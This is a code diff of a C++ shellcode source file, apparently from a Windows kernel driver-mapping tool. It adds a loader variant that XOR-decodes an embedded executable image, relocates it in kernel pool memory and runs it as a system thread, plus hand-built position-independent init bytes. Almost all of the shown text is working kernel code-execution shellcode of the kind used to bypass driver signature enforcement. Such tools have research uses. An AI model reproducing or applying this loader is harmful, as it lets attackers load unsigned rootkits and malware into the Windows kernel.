@@ -1,14 +1,14 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2021
+*  (C) COPYRIGHT AUTHORS, 2020 - 2022
 *
 *  TITLE:       SHELLCODE.CPP
 *
-*  VERSION:     1.10
+*  VERSION:     1.20
 *
-*  DATE:        17 Apr 2021
+*  DATE:        10 Feb 2022
 *
-*  Driver mapping shellcode implementation.
+*  Default driver mapping shellcode(s) implementation.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -336,6 +336,182 @@ ULONG NTAPI DbgPrintTest(
     UNREFERENCED_PARAMETER(Format);
     OutputDebugStringA("Inside DbgPrintTest\r\n");
     return 0;
+}
+
+/*
+* ScLoaderRoutineV1
+*
+* Purpose:
+*
+* Bootstrap shellcode variant 4.
+* Read image from shared section, process relocs and run it in allocated system thread.
+*
+* IRQL: PASSIVE_LEVEL
+*
+*/
+VOID NTAPI ScLoaderRoutineV1(
+    _In_ PSHELLCODE ShellCode
+)
+{
+    NTSTATUS                        status;
+    ULONG                           isz;
+    HANDLE                          hThread;
+    OBJECT_ATTRIBUTES               obja;
+    ULONG_PTR                       Image, exbuffer, pos;
+
+    PIMAGE_DOS_HEADER               dosh;
+    PIMAGE_FILE_HEADER              fileh;
+    PIMAGE_OPTIONAL_HEADER          popth;
+    PIMAGE_BASE_RELOCATION          rel;
+
+    DWORD_PTR                       delta;
+    LPWORD                          chains;
+    DWORD                           c, p, rsz, k;
+
+    PUCHAR                          ptr;
+
+    PKEVENT                         ReadyEvent;
+    PVOID                           SectionRef, pvSharedSection = NULL;
+    SIZE_T                          ViewSize;
+
+    PPAYLOAD_HEADER_V1              PayloadHeader;
+
+#ifdef ENABLE_DBGPRINT
+    CHAR                            szFormat1[] = { 'S', '%', 'l', 'x', 0 };
+    CHAR                            szFormat2[] = { 'F', '%', 'l', 'x', 0 };
+#endif
+
+    status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->SectionHandle,
+        SECTION_ALL_ACCESS, (POBJECT_TYPE) * (PVOID**)ShellCode->MmSectionObjectType, 0, (PVOID*)&SectionRef, NULL);
+
+    if (NT_SUCCESS(status)) {
+
+        ViewSize = ShellCode->SectionViewSize;
+
+        status = ShellCode->Import.ZwMapViewOfSection(ShellCode->SectionHandle,
+            NtCurrentProcess(),
+            (PVOID*)&pvSharedSection,
+            0,
+            PAGE_SIZE,
+            NULL,
+            &ViewSize,
+            ViewUnmap,
+            0,
+            PAGE_READWRITE);
+
+        if (NT_SUCCESS(status)) {
+
+            k = ShellCode->Tag;
+
+            PayloadHeader = (PAYLOAD_HEADER_V1*)pvSharedSection;
+            rsz = PayloadHeader->ImageSize;
+            ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
+
+            do {
+                *ptr ^= k;
+                k = _rotl(k, 1);
+                ptr++;
+                --rsz;
+            } while (rsz != 0);
+
+            Image = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
+            dosh = (PIMAGE_DOS_HEADER)Image;
+            fileh = (PIMAGE_FILE_HEADER)(Image + sizeof(DWORD) + dosh->e_lfanew);
+            popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
+            isz = popth->SizeOfImage;
+
+            //
+            // Allocate memory for mapped image.
+            //
+            exbuffer = (ULONG_PTR)ShellCode->Import.ExAllocatePoolWithTag(
+                NonPagedPool,
+                isz + PAGE_SIZE,
+                ShellCode->Tag) + PAGE_SIZE;
+
+            if (exbuffer != 0) {
+
+                exbuffer &= ~(PAGE_SIZE - 1);
+
+                if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
+                    if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
+                    {
+                        rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
+                            popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+
+                        rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
+                        delta = (DWORD_PTR)exbuffer - popth->ImageBase;
+                        c = 0;
+
+                        while (c < rsz) {
+                            p = sizeof(IMAGE_BASE_RELOCATION);
+                            chains = (LPWORD)((PBYTE)rel + p);
+
+                            while (p < rel->SizeOfBlock) {
+
+                                switch (*chains >> 12) {
+                                case IMAGE_REL_BASED_HIGHLOW:
+                                    *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
+                                    break;
+                                case IMAGE_REL_BASED_DIR64:
+                                    *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
+                                    break;
+                                }
+
+                                chains++;
+                                p += sizeof(WORD);
+                            }
+
+                            c += rel->SizeOfBlock;
+                            rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
+                        }
+                    }
+
+                //
+                // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
+                //
+                isz >>= 3;
+                for (pos = 0; pos < isz; pos++)
+                    ((PULONG64)exbuffer)[pos] = ((PULONG64)Image)[pos];
+
+                //
+                // Create system thread with handler set to image entry point.
+                //
+                hThread = NULL;
+                InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+
+                status = PayloadHeader->PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, &obja, NULL, NULL,
+                    (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), NULL);
+
+                if (NT_SUCCESS(status))
+                    PayloadHeader->ZwClose(hThread);
+
+                //
+                // Save result.
+                //
+                PayloadHeader->IoStatus.Status = status;
+
+            } //ExAllocatePoolWithTag(exbuffer)
+
+            ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
+                pvSharedSection);
+
+        } //ZwMapViewOfSection(pvSharedSection)
+
+        ShellCode->Import.ObfDereferenceObject(SectionRef);
+
+        //
+        // Fire the event to let userland know that we're ready.
+        //
+        status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->ReadyEventHandle,
+            SYNCHRONIZE | EVENT_MODIFY_STATE, NULL, 0, (PVOID*)&ReadyEvent, NULL);
+        if (NT_SUCCESS(status))
+        {
+            ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
+            ShellCode->Import.ObfDereferenceObject(ReadyEvent);
+        }
+
+    } // ObReferenceObjectByHandle success
+
 }
 
 /*
@@ -1070,6 +1246,9 @@ typedef NTSTATUS(NTAPI* pfnScDispatchRoutine)(
     _Inout_ struct _IRP* Irp,
     _In_ PVOID ShellCode);
 
+typedef VOID(NTAPI* pfnScLoaderRoutine)(
+    _In_ PVOID ShellCode);
+
 /*
 * ScDispatchRoutineDebugSelector
 *
@@ -1084,22 +1263,34 @@ NTSTATUS NTAPI ScDispatchRoutineDebugSelector(
     _In_ struct _DEVICE_OBJECT* DeviceObject,
     _Inout_ struct _IRP* Irp)
 {
-    pfnScDispatchRoutine DispatchRoutine;
+    union {
+        pfnScDispatchRoutine DispatchRoutine;
+        pfnScLoaderRoutine LoaderRoutine;
+    } Routine;
 
     switch (ShellVersion) {
+    case KDU_SHELLCODE_V4:
+        Routine.LoaderRoutine = (pfnScLoaderRoutine)ScLoaderRoutineV1;
+        break;
     case KDU_SHELLCODE_V3:
-        DispatchRoutine = (pfnScDispatchRoutine)ScDispatchRoutineV3;
+        Routine.DispatchRoutine = (pfnScDispatchRoutine)ScDispatchRoutineV3;
         break;
     case KDU_SHELLCODE_V2:
-        DispatchRoutine = (pfnScDispatchRoutine)ScDispatchRoutineV2;
+        Routine.DispatchRoutine = (pfnScDispatchRoutine)ScDispatchRoutineV2;
         break;
     case KDU_SHELLCODE_V1:
     default:
-        DispatchRoutine = (pfnScDispatchRoutine)ScDispatchRoutineV1;
+        Routine.DispatchRoutine = (pfnScDispatchRoutine)ScDispatchRoutineV1;
         break;
     }
 
-    return DispatchRoutine(DeviceObject, Irp, ShellPtr);
+    switch (ShellVersion) {
+    case KDU_SHELLCODE_V4:
+        Routine.LoaderRoutine(ShellPtr);
+        return STATUS_SUCCESS;
+    default:
+        return Routine.DispatchRoutine(DeviceObject, Irp, ShellPtr);
+    }
 }
 
 /*
@@ -1178,6 +1369,7 @@ SIZE_T ScGetViewSize(
     PSHELLCODE pvShellCode = (PSHELLCODE)ShellCodePtr;
 
     switch (ShellVersion) {
+    case KDU_SHELLCODE_V4:
     case KDU_SHELLCODE_V3:
     case KDU_SHELLCODE_V2:
     case KDU_SHELLCODE_V1:
@@ -1211,6 +1403,7 @@ DWORD ScSizeOf(
     case KDU_SHELLCODE_V2:
         payloadSize = sizeof(PAYLOAD_HEADER_V2);
         break;
+    case KDU_SHELLCODE_V4:
     case KDU_SHELLCODE_V1:
     default:
         payloadSize = sizeof(PAYLOAD_HEADER_V1);
@@ -1240,6 +1433,7 @@ BOOL ScBuildShellImportDebug(
 
     switch (ShellVersion) {
 
+    case KDU_SHELLCODE_V4:
     case KDU_SHELLCODE_V3:
     case KDU_SHELLCODE_V2:
     case KDU_SHELLCODE_V1:
@@ -1367,6 +1561,7 @@ HANDLE ScCreateReadyEvent(
     hReadyEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 
     switch (ShellVersion) {
+    case KDU_SHELLCODE_V4:
     case KDU_SHELLCODE_V3:
     case KDU_SHELLCODE_V2:
     case KDU_SHELLCODE_V1:
@@ -1463,6 +1658,7 @@ BOOLEAN ScStoreVersionSpecificData(
 
         break;
 
+    case KDU_SHELLCODE_V4:
     case KDU_SHELLCODE_V2:
     case KDU_SHELLCODE_V1:
         //
@@ -1488,6 +1684,98 @@ VOID ScFree(
 )
 {
     VirtualFree(ShellPtr, 0, MEM_RELEASE);
+}
+
+/*
+* ScBuildInitCodeForVersion
+*
+* Purpose:
+*
+* Prepare init code for shellcode version specific.
+*
+*/
+VOID ScBuildInitCodeForVersion(
+    _In_ ULONG ShellVersion,
+    _In_ PSHELLCODE pvShellCode
+)
+{
+    //
+    // Fill entire init code with int 3
+    //
+    memset(pvShellCode->InitCode, 0xCC, sizeof(pvShellCode->InitCode));
+
+    switch (ShellVersion) {
+    case KDU_SHELLCODE_V4:
+        // 00 call +5
+        // 05 pop rcx
+        // 06 sub rcx, 5
+        // 0A jmps 10 
+        // 0B int 3
+        // 0C int 3
+        // 0D int 3
+        // 0E int 3
+        // 0F int 3
+        // 10 code
+
+        //call +5
+        pvShellCode->InitCode[0x0] = 0xE8;
+        pvShellCode->InitCode[0x1] = 0x00;
+        pvShellCode->InitCode[0x2] = 0x00;
+        pvShellCode->InitCode[0x3] = 0x00;
+        pvShellCode->InitCode[0x4] = 0x00;
+
+        //pop rcx
+        pvShellCode->InitCode[0x5] = 0x59;
+
+        //sub rcx, 5
+        pvShellCode->InitCode[0x6] = 0x48;
+        pvShellCode->InitCode[0x7] = 0x83;
+        pvShellCode->InitCode[0x8] = 0xE9;
+        pvShellCode->InitCode[0x9] = 0x05;
+
+        // jmps 
+        pvShellCode->InitCode[0xA] = 0xEB;
+        pvShellCode->InitCode[0xB] = 0x04;
+
+        break;
+
+    case KDU_SHELLCODE_V3:
+    case KDU_SHELLCODE_V2:
+    case KDU_SHELLCODE_V1:
+    default:
+
+        // 00 call +5
+        // 05 pop r8
+        // 07 sub r8, 5
+        // 0B jmps 10 
+        // 0D int 3
+        // 0E int 3
+        // 0F int 3
+        // 10 code
+
+        //call +5
+        pvShellCode->InitCode[0x0] = 0xE8;
+        pvShellCode->InitCode[0x1] = 0x00;
+        pvShellCode->InitCode[0x2] = 0x00;
+        pvShellCode->InitCode[0x3] = 0x00;
+        pvShellCode->InitCode[0x4] = 0x00;
+
+        //pop r8
+        pvShellCode->InitCode[0x5] = 0x41;
+        pvShellCode->InitCode[0x6] = 0x58;
+
+        //sub r8, 5
+        pvShellCode->InitCode[0x7] = 0x49;
+        pvShellCode->InitCode[0x8] = 0x83;
+        pvShellCode->InitCode[0x9] = 0xE8;
+        pvShellCode->InitCode[0xA] = 0x05;
+
+        // jmps 
+        pvShellCode->InitCode[0xB] = 0xEB;
+        pvShellCode->InitCode[0xC] = 0x03;
+
+        break;
+    }
 }
 
 /*
@@ -1522,6 +1810,9 @@ PVOID ScAllocate(
     scSize = ScSizeOf(ShellVersion, NULL);
 
     switch (ShellVersion) {
+    case KDU_SHELLCODE_V4:
+        procPtr = (PBYTE)ScLoaderRoutineV1;
+        break;
     case KDU_SHELLCODE_V3:
         procPtr = (PBYTE)ScDispatchRoutineV3;
         break;
@@ -1557,6 +1848,7 @@ PVOID ScAllocate(
     pvBootstrap = pvShellCode->BootstrapCode;
 
     switch (ShellVersion) {
+    case KDU_SHELLCODE_V4:
     case KDU_SHELLCODE_V3:
     case KDU_SHELLCODE_V2:
     case KDU_SHELLCODE_V1:
@@ -1567,42 +1859,10 @@ PVOID ScAllocate(
         break;
     }
 
-
     //
     // Build initial code part (init code always at same offset for all variants).
     //
-    // 00 call +5
-    // 05 pop r8
-    // 07 sub r8, 5
-    // 0B jmps 10 
-    // 0D int 3
-    // 0E int 3
-    // 0F int 3
-    // 10 code
-
-    //int 3
-    memset(pvShellCode->InitCode, 0xCC, sizeof(pvShellCode->InitCode));
-
-    //call +5
-    pvShellCode->InitCode[0x0] = 0xE8;
-    pvShellCode->InitCode[0x1] = 0x00;
-    pvShellCode->InitCode[0x2] = 0x00;
-    pvShellCode->InitCode[0x3] = 0x00;
-    pvShellCode->InitCode[0x4] = 0x00;
-
-    //pop r8
-    pvShellCode->InitCode[0x5] = 0x41;
-    pvShellCode->InitCode[0x6] = 0x58;
-
-    //sub r8, 5
-    pvShellCode->InitCode[0x7] = 0x49;
-    pvShellCode->InitCode[0x8] = 0x83;
-    pvShellCode->InitCode[0x9] = 0xE8;
-    pvShellCode->InitCode[0xA] = 0x05;
-
-    // jmps 
-    pvShellCode->InitCode[0xB] = 0xEB;
-    pvShellCode->InitCode[0xC] = 0x03;
+    ScBuildInitCodeForVersion(ShellVersion, pvShellCode);
 
 #ifdef _DEBUG
 
@@ -1799,6 +2059,7 @@ BOOLEAN ScResolveImportForPayload(
 
         break;
 
+    case KDU_SHELLCODE_V4:
     case KDU_SHELLCODE_V1:
     default:
 
